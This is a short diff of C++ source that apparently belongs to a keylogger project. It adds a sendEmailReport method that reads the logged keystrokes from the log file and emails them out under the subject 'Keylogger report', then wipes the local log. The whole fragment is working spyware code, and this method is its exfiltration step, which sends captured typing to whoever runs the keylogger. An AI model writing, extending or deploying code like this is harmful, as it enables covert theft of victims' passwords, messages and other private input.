@@ -74,3 +74,28 @@ bool Keylogger::sendEmailCallback(std::string emailTo) {
 	auto emailService = make_shared<EmailService>();
 	return emailService->sendEmail("Test", "test", emailTo);
 }
+
+bool Keylogger::sendEmailReport(bool deleteLocal) {
+	auto emailService = make_shared<EmailService>();
+	// Create email subject
+	std::stringstream subject;
+	subject << "Keylogger report. " << "Compname";
+
+	// Create email body
+	logFile.close();
+	std::ifstream logData;
+	logData.open(this->FILENAME, std::ios::in);
+	std::string body((std::istreambuf_iterator<char>(logData)),
+		std::istreambuf_iterator<char>());
+	logData.close();
+
+	bool sendEmailResult = emailService->sendEmail(subject.str(), body, "");
+
+	if (!sendEmailResult) {
+		return false;
+	}
+
+	logFile.open(this->FILENAME, std::ios::trunc);
+	this->lastActiveWindow = nullptr;
+	return true;
+}
